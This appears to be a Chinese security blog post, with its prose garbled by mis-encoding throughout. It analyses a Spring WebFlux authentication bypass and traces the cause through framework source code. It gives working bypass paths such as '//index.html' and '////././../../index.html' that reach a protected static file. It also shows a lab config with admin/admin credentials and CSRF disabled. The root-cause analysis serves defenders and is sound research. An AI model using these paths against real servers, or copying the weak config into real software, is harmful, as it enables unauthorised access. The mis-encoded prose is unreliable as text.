<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.web.server.ServerHttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.MapReactiveUserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.server.SecurityWebFilterChain;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.security.config.Customizer.withDefaults;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebFluxSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSecurityConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityWebFilterChain <span class="title function_">securityWebFilterChain</span><span class="params">(ServerHttpSecurity http)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> http</span><br><span class="line">                .authorizeExchange(exchanges -&gt; exchanges</span><br><span class="line">                        .pathMatchers(<span class="string">&quot;/index.html&quot;</span>).authenticated()</span><br><span class="line">                        .anyExchange().permitAll())</span><br><span class="line">                .formLogin(withDefaults())</span><br><span class="line">                .httpBasic(withDefaults())</span><br><span class="line">                .csrf(ServerHttpSecurity.CsrfSpec::disable)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰å†…å­˜ä¸­çš„ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MapReactiveUserDetailsService <span class="title function_">userDetailsService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">admin</span> <span class="operator">=</span> User.withUsername(<span class="string">&quot;admin&quot;</span>).password(<span class="string">&quot;admin&quot;</span>).roles(<span class="string">&quot;ADMIN&quot;</span>) .build();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapReactiveUserDetailsService</span>(admin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>resources</code>ç›®å½•ä¸‹åˆ›å»º<code>index.html</code>æ–‡ä»¶å†™å…¥ä»»æ„å†…å®¹<br>æ­¤æ—¶è®¿é—®è¯¥èµ„æº <code>http://127.0.0.1:8080/index.html</code> ä¼šå“åº”<code>401</code>çŠ¶æ€ç æç¤º<code>Unauthorized</code><br><img src="/archives/f65bb354/img_1.png" alt="img_1.png"><br>è®¿é—®<code>http://127.0.0.1:8080//index.html</code> ä¼šå“åº”<code>200</code>çŠ¶æ€ç ï¼Œå¹¶ä¸”è¿”å›<code>index.html</code>æ–‡ä»¶å†…å®¹<br><img src="/archives/f65bb354/img_2.png" alt="img_2.png"><br>è¿˜å¯ä»¥å¯¹urlè¿›è¡Œå˜å½¢ <code>http://127.0.0.1:8080////././../../index.html</code> ä¹Ÿå¯ä»¥è®¿é—®åˆ°è¯¥èµ„æº</p>
<h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>WebFluxä¹Ÿæ˜¯éµå®ˆservletè§„èŒƒçš„ï¼Œå…¶Filterèµ·ç‚¹ä¸º<code>DefaultWebFilterChain</code>çš„<code>filter</code>æ–¹æ³•<br>å½“ä¸€æ¬¡è¯·æ±‚ç¬¬ä¸€æ¬¡è¿›å…¥<code>filter</code>çš„æ—¶å€™<code>currentFilter</code>çš„å€¼ä¸º<code>WebFilterChainProxy</code>å¯¹è±¡ï¼Œ <code>handler</code>çš„å€¼ä¸º<code>DispatcherHandler</code>å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Mono.defer(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.currentFilter != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.chain != <span class="literal">null</span> ? <span class="built_in">this</span>.invokeFilter(<span class="built_in">this</span>.currentFilter, <span class="built_in">this</span>.chain, exchange) : <span class="built_in">this</span>.handler.handle(exchange);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>WebFilterChainProxy ä¸­å­˜å‚¨äº†æ³¨å†Œçš„æ‰€æœ‰è¿‡æ»¤å™¨ï¼Œå½“å…¶filteræ–¹æ³•è¢«è°ƒç”¨æ—¶ä¼šè°ƒç”¨åŒ¹é…å™¨å¯¹è¯·æ±‚è·¯å¾„è¿›è¡ŒåŒ¹é…ï¼Œ<br>åŒ¹é…æˆåŠŸåä¼šå°†åŒ¹é…åˆ°çš„è¿‡æ»¤å™¨å¯¹è±¡èµ‹å€¼ç»™currentFilterï¼Œå¹¶è°ƒç”¨è¿‡æ»¤å™¨çš„filteræ–¹æ³•ï¼Œè¿‡æ»¤å™¨æ‰§è¡Œå®Œåä¼šè°ƒç”¨nextæ–¹æ³•ï¼Œ<br>ç»§ç»­è°ƒç”¨ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œç›´åˆ°æ‰€æœ‰è¿‡æ»¤å™¨æ‰§è¡Œå®Œï¼Œæœ€ç»ˆè°ƒç”¨ DispatcherHandler å¯¹è±¡çš„handleæ–¹æ³•å¤„ç†è¯·æ±‚<br><img src="/archives/f65bb354/img_3.png" alt="img_3.png"><br>MatcherSecurityWebFilterChain<br>æˆ‘ä»¬åœ¨ç­¾åé…ç½®ç±»åˆ›å»ºæ—¶è®¾ç½®çš„urlè®¿é—®è§„åˆ™å°±æ˜¯åœ¨è¿‡æ»¤å™¨çš„å¤„ç†è¿‡ç¨‹ä¸­è¢«éªŒè¯çš„ï¼Œå› ä¸ºæˆ‘ä»¬è®¿é—®çš„æ˜¯<code>//index.html</code>ï¼Œè¯¥urlè¢«è®¤ä¸ºæ˜¯ä¸éœ€è¦è®¤è¯çš„ã€‚<br><code>//index.html</code>ä¸æ˜¯æ ‡å‡†çš„é™æ€èµ„æºè®¿é—®æ–¹æ³•ï¼Œæ‰€ä»¥è¦é€šè¿‡è¯¥urlè®¿é—®åˆ°èµ„æº<code>index.html</code>è‚¯å®šè¿˜æœ‰ä¸€ä¸ªè¯·æ±‚è·¯å¾„åˆ°æœåŠ¡å™¨èµ„æºæ˜ å°„çš„å¤„ç†é€»è¾‘è¿›è¡Œå’Œæ‰èƒ½å¯¼è‡´ç»•è¿‡ã€‚<br>è¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨è¯·æ±‚å¤„ç†å™¨çš„å¤„ç†è¿‡ç¨‹ä¸­ã€‚<br>å½“è¯·æ±‚é€šè¿‡äº†æ‰€æœ‰è¿‡æ»¤å™¨çš„è¿‡æ»¤åï¼ŒDispatcherHandler ä¼šæ ¹æ®è¯·æ±‚urlé€‰æ‹©åˆé€‚çš„è¯·æ±‚å¤„ç†å™¨å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†<br>åœ¨<code>handleRequestWith</code>æ–¹æ³•ä¸­ä¼šé€‰å–åˆé€‚çš„å¤„ç†å™¨é€‚é…å™¨å¯¹å¤„ç†å™¨è¿›è¡Œé€‚é…ç„¶åè°ƒç”¨å¤„ç†å™¨çš„<code>handler</code>æ–¹æ³•  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">handle</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.createNotFoundError();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> CorsUtils.isPreFlightRequest(exchange.getRequest()) ? <span class="built_in">this</span>.handlePreFlight(exchange) : Flux.fromIterable(<span class="built_in">this</span>.handlerMappings).concatMap((mapping) -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> mapping.getHandler(exchange);</span><br><span class="line">            &#125;).next().switchIfEmpty(<span class="built_in">this</span>.createNotFoundError()).onErrorResume((ex) -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.handleResultMono(exchange, Mono.error(ex));</span><br><span class="line">            &#125;).flatMap((handler) -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.handleRequestWith(exchange, handler);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å½“è®¿é—®é™æ€æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨çš„å¤„ç†å™¨ä¸º<code>ResourceWebHandler</code>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">handle</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getResource(exchange).switchIfEmpty(Mono.defer(() -&gt; &#123;</span><br><span class="line">            logger.debug(exchange.getLogPrefix() + <span class="string">&quot;Resource not found&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> Mono.error(<span class="keyword">new</span> <span class="title class_">NoResourceFoundException</span>(<span class="built_in">this</span>.getResourcePath(exchange)));</span><br><span class="line">        &#125;))</span><br><span class="line">        ...</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p><code>getResource</code>æ–¹æ³•å°†å°è¯•è·å–ç”¨æˆ·è®¿é—®çš„èµ„æº  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Mono&lt;Resource&gt; <span class="title function_">getResource</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rawPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getResourcePath(exchange);</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.processPath(rawPath);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(path) &amp;&amp; !<span class="built_in">this</span>.isInvalidPath(path)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isInvalidEncodedPath(path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> Mono.empty();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Assert.state(<span class="built_in">this</span>.resolverChain != <span class="literal">null</span>, <span class="string">&quot;ResourceResolverChain not initialized&quot;</span>);</span><br><span class="line">                Assert.state(<span class="built_in">this</span>.transformerChain != <span class="literal">null</span>, <span class="string">&quot;ResourceTransformerChain not initialized&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.resolverChain.resolveResource(exchange, path, <span class="built_in">this</span>.getLocations()).flatMap((resource) -&gt; &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.transformerChain.transform(exchange, resource);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Mono.empty();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>getResourcePath</code>æ–¹æ³•å°†å°è¯•é€šè¿‡urlè·å–èµ„æºåœ¨æœåŠ¡å™¨ä¸Šçš„ä½ç½®  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getResourcePath</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">PathPattern</span> <span class="variable">pattern</span> <span class="operator">=</span> (PathPattern)exchange.getRequiredAttribute(HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE);</span><br><span class="line">        <span class="keyword">if</span> (!pattern.hasPatternSyntax()) &#123;</span><br><span class="line">            <span class="keyword">return</span> pattern.getPatternString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">PathContainer</span> <span class="variable">pathWithinHandler</span> <span class="operator">=</span> (PathContainer)exchange.getRequiredAttribute(HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE);</span><br><span class="line">            <span class="keyword">return</span> pathWithinHandler.value();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/archives/f65bb354/img_4.png" alt="img_4.png"><br>ä»ä¸Šé¢çš„ä»£ç è¿è¡Œç»“æœå¯çŸ¥èµ„æºè·¯å¾„æ˜¯ä»<code>exchange</code>çš„å±æ€§<code>HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE</code>ä¸­è·å–çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè·¯å¾„åœ¨<code>exchange</code>æ„å»ºçš„æ—¶å€™å·²ç»ç¡®å®šäº†<br>æ­¤æ—¶æˆ‘ä»¬éœ€è¦å›æº¯<code>exchange</code>çš„<code>HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE</code>å±æ€§çš„æ„å»ºæ—¶æœº<br>é€šè¿‡æ ˆå›æº¯ï¼Œåœ¨<code>org.springframework.web.reactive.handler.AbstractUrlHandlerMapping.getHandlerInternal</code>æ–¹æ³•ä¸­å‘ç°äº†ç«¯å€ª</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Object&gt; <span class="title function_">getHandlerInternal</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">PathContainer</span> <span class="variable">lookupPath</span> <span class="operator">=</span> exchange.getRequest().getPath().pathWithinApplication();</span><br><span class="line"></span><br><span class="line">        Object handler;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            handler = <span class="built_in">this</span>.lookupHandler(lookupPath, exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> Mono.error(var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Mono.justOrEmpty(handler);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­è·Ÿè¿›åˆ°<code>lookupHandler</code>æ–¹æ³•ä¸­  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">lookupHandler</span><span class="params">(PathContainer lookupPath, ServerWebExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        List&lt;PathPattern&gt; matches = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.handlerMap.keySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="type">PathPattern</span> <span class="variable">pattern</span> <span class="operator">=</span> (PathPattern)var4.next();</span><br><span class="line">            <span class="keyword">if</span> (pattern.matches(lookupPath)) &#123;</span><br><span class="line">                matches = matches != <span class="literal">null</span> ? matches : <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                matches.add(pattern);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (matches == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (matches.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                matches.sort(PathPattern.SPECIFICITY_COMPARATOR);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">                    <span class="type">Log</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.logger;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">var10001</span> <span class="operator">=</span> exchange.getLogPrefix();</span><br><span class="line">                    var10000.debug(var10001 + <span class="string">&quot;Matching patterns &quot;</span> + matches);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">PathPattern</span> <span class="variable">pattern</span> <span class="operator">=</span> (PathPattern)matches.get(<span class="number">0</span>);</span><br><span class="line">            <span class="type">PathContainer</span> <span class="variable">pathWithinMapping</span> <span class="operator">=</span> pattern.extractPathWithinPattern(lookupPath);</span><br><span class="line">            PathPattern.<span class="type">PathMatchInfo</span> <span class="variable">matchInfo</span> <span class="operator">=</span> pattern.matchAndExtract(lookupPath);</span><br><span class="line">            Assert.notNull(matchInfo, <span class="string">&quot;Expected a match&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="built_in">this</span>.handlerMap.get(pattern);</span><br><span class="line">            <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">handlerName</span> <span class="operator">=</span> (String)handler;</span><br><span class="line">                handler = <span class="built_in">this</span>.obtainApplicationContext().getBean(handlerName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.handlerPredicate != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.handlerPredicate.test(handler, exchange)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.validateHandler(handler, exchange);</span><br><span class="line">                exchange.getAttributes().put(BEST_MATCHING_HANDLER_ATTRIBUTE, handler);</span><br><span class="line">                exchange.getAttributes().put(BEST_MATCHING_PATTERN_ATTRIBUTE, pattern);</span><br><span class="line">                ServerHttpObservationFilter.findObservationContext(exchange).ifPresent((context) -&gt; &#123;</span><br><span class="line">                    context.setPathPattern(pattern.toString());</span><br><span class="line">                &#125;);</span><br><span class="line">                ServerRequestObservationContext.findCurrent(exchange.getAttributes()).ifPresent((context) -&gt; &#123;</span><br><span class="line">                    context.setPathPattern(pattern.toString());</span><br><span class="line">                &#125;);</span><br><span class="line">                exchange.getAttributes().put(PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE, pathWithinMapping);</span><br><span class="line">                exchange.getAttributes().put(URI_TEMPLATE_VARIABLES_ATTRIBUTE, matchInfo.getUriVariables());</span><br><span class="line">                <span class="keyword">return</span> handler;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹å…³æ³¨ä¸‹é¢ä¸¤è¡Œä»£ç   </p>
<blockquote>
<p>PathContainer pathWithinMapping &#x3D; pattern.extractPathWithinPattern(lookupPath);<br>exchange.getAttributes().put(PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE, pathWithinMapping);</p>
</blockquote>
<p>æ­¤æ—¶ pathWithinMapping çš„pathå€¼å·²ç»è¢«æ­£ç¡®æå–ä¸º<code>index.html</code>äº†ï¼Œæ‰€ä»¥ä»éœ€å‘å‰å›æº¯<br><img src="/archives/f65bb354/img_5.png" alt="img_5.png">  </p>
<p>å¯ä»¥å‘ç° <code>PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE</code> å±æ€§ æ˜¯ä» <code>lookupPath</code> ä¸­æå–å‡ºæ¥çš„ã€‚<br>æ­¤æ—¶æŸ¥çœ‹ <code>lookpath</code> çš„å€¼ æ˜¯ä¸€ä¸ª<code>PathContainer</code>å¯¹è±¡ï¼ŒæŸ¥çœ‹å…¶å€¼å‘ç°å…¶<code>path</code>å€¼ä¸º<code>//index.html</code><br><img src="/archives/f65bb354/img_6.png" alt="img_6.png"><br>æ‰€ä»¥ä»<code>//index.html</code>åˆ°<code>index.html</code>çš„è½¬æ¢æ˜¯å‘ç”Ÿåœ¨ <code>extractPathWithinPattern</code>æ–¹æ³•ä¸­çš„<br>è¯¥æ–¹æ³•é¦–å…ˆä¼šä»å¤´å¼€å§‹éå†å­—ç¬¦ä¸²pathçš„æ¯ä¸ªå…ƒç´ ï¼Œå¦‚æœè¯¥å…ƒç´ æ˜¯<code>Separator</code> ç±»å‹åˆ™å°†<code>startIndex</code> åŠ ä¸€ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªä¸ä¸º<code>Separator</code>çš„å…ƒç´ ä¸ºæ­¢ï¼Œ<br>ç„¶åä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹åå‘éå†é‡åˆ°<code>Separator</code>ç±»å‹çš„å…ƒç´ å°±å°†<code>endIndex</code>å‡ä¸€ï¼Œé‡åˆ°ä¸æ˜¯<code>Separator</code>çš„å…ƒç´ å°±åœæ­¢éå†ã€‚<br>ç„¶åå†ä»<code>startIndex</code>å¼€å§‹éå†ç›´åˆ°<code>endIndex</code>ç»“æŸï¼Œå¦‚æœå†æ¬¡é‡åˆ°äº†<code>Separator</code>ç±»å‹å…ƒç´ å°±è®¤ä¸ºè¯¥è·¯å¾„æ˜¯å¤šå±‚çš„ï¼Œæ­¤æ—¶å°†<code>multipleAdjacentSeparators</code>è®¾ä¸ºtrue<br>æˆ‘ä»¬çš„çš„ä¾‹å­ä¸æ¶‰åŠ<code>multipleAdjacent</code>è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆå°±æˆªå–<code>startIndex</code>åˆ°<code>endIndex</code>ä¹‹é—´çš„å…ƒç´ ï¼Œå³<code>index.html</code>ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PathContainer <span class="title function_">extractPathWithinPattern</span><span class="params">(PathContainer path)</span> &#123;</span><br><span class="line">       List&lt;PathContainer.Element&gt; pathElements = path.elements();</span><br><span class="line">       <span class="type">int</span> <span class="variable">pathElementsCount</span> <span class="operator">=</span> pathElements.size();</span><br><span class="line">       <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       PathElement elem;</span><br><span class="line">       <span class="keyword">for</span>(elem = <span class="built_in">this</span>.head; elem != <span class="literal">null</span> &amp;&amp; elem.isLiteral(); ++startIndex) &#123;</span><br><span class="line">           elem = elem.next;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (elem == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> PathContainer.parsePath(<span class="string">&quot;&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">while</span>(startIndex &lt; pathElementsCount &amp;&amp; pathElements.get(startIndex) <span class="keyword">instanceof</span> PathContainer.Separator) &#123;</span><br><span class="line">               ++startIndex;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="type">int</span> endIndex;</span><br><span class="line">           <span class="keyword">for</span>(endIndex = pathElements.size(); endIndex &gt; <span class="number">0</span> &amp;&amp; pathElements.get(endIndex - <span class="number">1</span>) <span class="keyword">instanceof</span> PathContainer.Separator; --endIndex) &#123;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="type">boolean</span> <span class="variable">multipleAdjacentSeparators</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; endIndex - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">               <span class="keyword">if</span> (pathElements.get(i) <span class="keyword">instanceof</span> PathContainer.Separator &amp;&amp; pathElements.get(i + <span class="number">1</span>) <span class="keyword">instanceof</span> PathContainer.Separator) &#123;</span><br><span class="line">                   multipleAdjacentSeparators = <span class="literal">true</span>;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="type">PathContainer</span> <span class="variable">resultPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">           <span class="keyword">if</span> (multipleAdjacentSeparators) &#123;</span><br><span class="line">               <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">               <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                   PathContainer.Element e;</span><br><span class="line">                   <span class="keyword">do</span> &#123;</span><br><span class="line">                       <span class="keyword">if</span> (i &gt;= endIndex) &#123;</span><br><span class="line">                           resultPath = PathContainer.parsePath(sb.toString(), <span class="built_in">this</span>.pathOptions);</span><br><span class="line">                           <span class="keyword">return</span> resultPath;</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       e = (PathContainer.Element)pathElements.get(i++);</span><br><span class="line">                       sb.append(e.value());</span><br><span class="line">                   &#125; <span class="keyword">while</span>(!(e <span class="keyword">instanceof</span> PathContainer.Separator));</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">while</span>(i &lt; endIndex &amp;&amp; pathElements.get(i) <span class="keyword">instanceof</span> PathContainer.Separator) &#123;</span><br><span class="line">                       ++i;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (startIndex &gt;= endIndex) &#123;</span><br><span class="line">               resultPath = PathContainer.parsePath(<span class="string">&quot;&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               resultPath = path.subPath(startIndex, endIndex);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> resultPath;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è§£é‡Šäº†ä¸ºä»€ä¹ˆ<code>//index.html</code>å¯ä»¥ç»•è¿‡è®¤è¯ï¼Œä¸‹é¢è§£é‡Šä¸ºä»€ä¹ˆ<code>///../</code>ä¹Ÿèƒ½ç»•è¿‡è®¤è¯ã€‚<br><code>../</code>è¡¨ç¤ºè½¬åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œæ‰€ä»¥<code>///../index.html</code>ä¼šè¢«<code>WebFlux</code>å¤„ç†æˆ<code>//index.html</code>ï¼Œåˆ°äº†è·¯å¾„æ˜ å°„çš„æ—¶å€™ä»ç„¶æ˜¯å¤„ç†<code>//</code>çš„é—®é¢˜ã€‚<br>ä¸‹é¢å¯¹è¯¥æ¼æ´çš„æˆå› è¿›è¡Œæ€»ç»“ã€‚<br>åº”ç”¨é…ç½®çš„éœ€è¦ç”¨æˆ·æˆæƒçš„é™æ€èµ„æºå¯é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚è·¯å¾„è¿›è¡Œç»•è¿‡ï¼ŒåŸå› åœ¨äºæ”»å‡»è¿™æ„é€ çš„ç±»ä¼¼<code>//</code> ä¸<code>///../</code> ç±»å‹çš„è¯·æ±‚å› åœ¨è¿‡æ»¤å™¨ä¸­æœªèƒ½ä¸è®¾å®šçš„é™æ€èµ„æºè®¿é—®è§„åˆ™åŒ¹é…ï¼Œ<br>ä»è€Œç»•è¿‡äº†è¿‡æ»¤å™¨éªŒè¯ï¼Œè€Œåœ¨åç»­è¿›è¡Œè¯·æ±‚è·¯å¾„ä¸æœåŠ¡å™¨èµ„æºæ˜ å°„çš„è¿‡ç¨‹ä¸­ä¼šé’ˆå¯¹è¯¥è¯·æ±‚è·¯å¾„è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œåªæå–è·¯å¾„ä¸¤ç«¯<code>/</code>ä¹‹é—´çš„å†…å®¹ä½œä¸ºæœåŠ¡å™¨ä¸Šèµ„æºçš„è·¯å¾„<br>ä»è€Œå¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥é€šè¿‡ç•¸å½¢è¯·æ±‚è·¯å¾„è®¿é—®å—é™é™æ€èµ„æºã€‚</p>
